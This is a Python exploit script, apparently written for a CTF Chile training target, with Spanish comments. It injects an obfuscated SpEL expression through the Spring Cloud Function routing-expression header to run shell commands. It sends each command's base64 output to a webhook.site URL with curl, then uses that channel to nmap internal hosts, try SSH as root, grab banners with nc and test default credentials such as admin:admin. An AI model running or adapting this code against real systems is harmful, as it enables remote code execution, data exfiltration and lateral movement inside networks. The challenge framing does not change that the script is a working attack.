#!/usr/bin/env python3
"""
CTF Chile - Escaneo profundo de servicios internos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Escaneo profundo de servicios...")

# Verificar que hosts están realmente disponibles
probe("nmap_209_1", "timeout 10 nmap -p 22,80,443,8080,3000,8443 10.160.209.1 2>/dev/null | grep -E 'PORT|open|closed'")
probe("nmap_209_2", "timeout 10 nmap -p 22,80,443,8080,3000,8443 10.160.209.2 2>/dev/null | grep -E 'PORT|open|closed'")

print("[*] Explorando servicio SSH...")
probe("ssh_209_1", "timeout 5 ssh -o StrictHostKeyChecking=no root@10.160.209.1 'echo test' 2>&1 || echo 'SSH_FAILED'")
probe("ssh_banner_209_1", "timeout 3 nc 10.160.209.1 22 | head -2")

print("[*] Probando servicios web con headers específicos...")
probe("web_209_1_headers", "curl -s -H 'Host: vault.internal' -H 'User-Agent: Internal' http://10.160.209.1/ | head -10")
probe("web_209_1_80_full", "timeout 5 curl -s http://10.160.209.1/ | head -30")

print("[*] Buscando archivos comunes...")
probe("robots_209_1", "curl -s http://10.160.209.1/robots.txt")
probe("sitemap_209_1", "curl -s http://10.160.209.1/sitemap.xml")
probe("readme_209_1", "curl -s http://10.160.209.1/README.txt")

print("[*] Probando puerto 3000 (posible Node.js)...")
probe("node_209_1", "curl -s http://10.160.209.1:3000/")
probe("node_api_209_1", "curl -s http://10.160.209.1:3000/api")
probe("node_health_209_1", "curl -s http://10.160.209.1:3000/health")

print("[*] Explorando servicios con autenticación básica...")
probe("auth_209_1", "curl -s -u admin:admin http://10.160.209.1/ | head -10")
probe("auth_209_1_8080", "curl -s -u admin:password http://10.160.209.1:8080/ | head -10")

print("[*] Verificando si podemos hacer tunneling/proxy...")
probe("curl_external", "timeout 5 curl -s http://10.160.209.1/ -v 2>&1 | head -15")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags y información útil
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

            # Detectar servicios activos
            if "open" in decoded.lower() or "HTTP" in decoded or "ssh" in decoded.lower():
                print("🔍 Servicio activo detectado")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")